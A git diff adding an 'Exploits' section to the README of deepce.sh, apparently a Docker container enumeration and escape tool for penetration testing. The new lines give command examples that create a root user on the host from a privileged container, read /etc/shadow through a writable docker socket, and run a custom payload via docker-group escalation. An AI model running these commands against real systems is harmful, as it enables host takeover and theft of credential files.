@@ -80,6 +80,24 @@ chmod +x ./deepce.sh
 ./deepce.sh 
 ```
 
+## Exploits
+The following examples show the different kinds of exploits that can be performed and the avaliable payloads.
+
+- Exploit a privileged container to create a new root user on the host operating system:
+```bash
+./deepce.sh --no-enumeration -exploit PRIVILEGED --username deepce --password deepce
+```
+
+- Exploit a writable docker sock file in order to print the contents of `/etc/shadow`
+```bash
+./deepce.sh --no-enumeration -exploit SOCK --shadow
+```
+
+- Escalate to root via membership to the docker group on a host and run a custom payload
+```bash
+./deepce.sh --no-enumeration -exploit DOCKER --command "whoami>/tmp/hacked"
+```
+
 # Advanced Usage
 
 It is possible to download and run deepce without touching the disk, however you will be unable to easily set arguments (direct manipulation of variables is possible using export).
